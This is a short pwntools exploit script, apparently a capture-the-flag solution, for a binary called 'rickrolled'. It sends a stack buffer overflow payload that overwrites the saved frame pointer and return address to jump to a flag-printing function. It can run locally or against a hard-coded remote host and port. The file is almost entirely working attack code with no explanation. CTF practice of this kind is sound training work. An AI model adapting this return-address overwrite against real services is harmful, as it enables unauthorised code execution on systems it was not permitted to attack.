from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rickrolled"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("43.205.113.100", 8223)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


flag = 0x40125a
bss = 0x0405060+0x800
read_again = 0x4012DB
payload = b"a" * 0x30 + p64(bss)
payload += p64(flag)
#payload += p64(read_again)

ddebug("b *0x4014B6\n continue")
io.sendlineafter("Do you have anything to say to me?\n", payload)

io.recvuntil("Here is your flag: \n")
data = io.recv(100)
log.success(data)

io.interactive()
